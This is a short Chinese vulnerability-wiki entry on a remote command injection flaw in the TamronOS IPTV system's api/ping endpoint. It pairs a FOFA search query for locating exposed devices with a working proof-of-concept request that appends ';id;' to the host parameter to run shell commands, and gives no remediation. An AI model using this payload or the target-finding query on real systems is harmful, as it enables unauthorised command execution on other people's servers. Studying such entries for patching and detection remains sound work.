# TamronOS IPTV系统 ping 任意命令执行漏洞

## 漏洞描述

TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令

## 漏洞影响

> [!NOTE]
>
> TamronOS IPTV系统

## FOFA

> [!NOTE]
>
> app="TamronOS-IPTV系统"

## 漏洞复现

登录页面如下

![image-20210615145308242](http://wikioss.peiqi.tech/vuln/image-20210615145308242.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞POC为

```
/api/ping?count=5&host=;id;
```

![image-20210615145342322](http://wikioss.peiqi.tech/vuln/image-20210615145342322.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)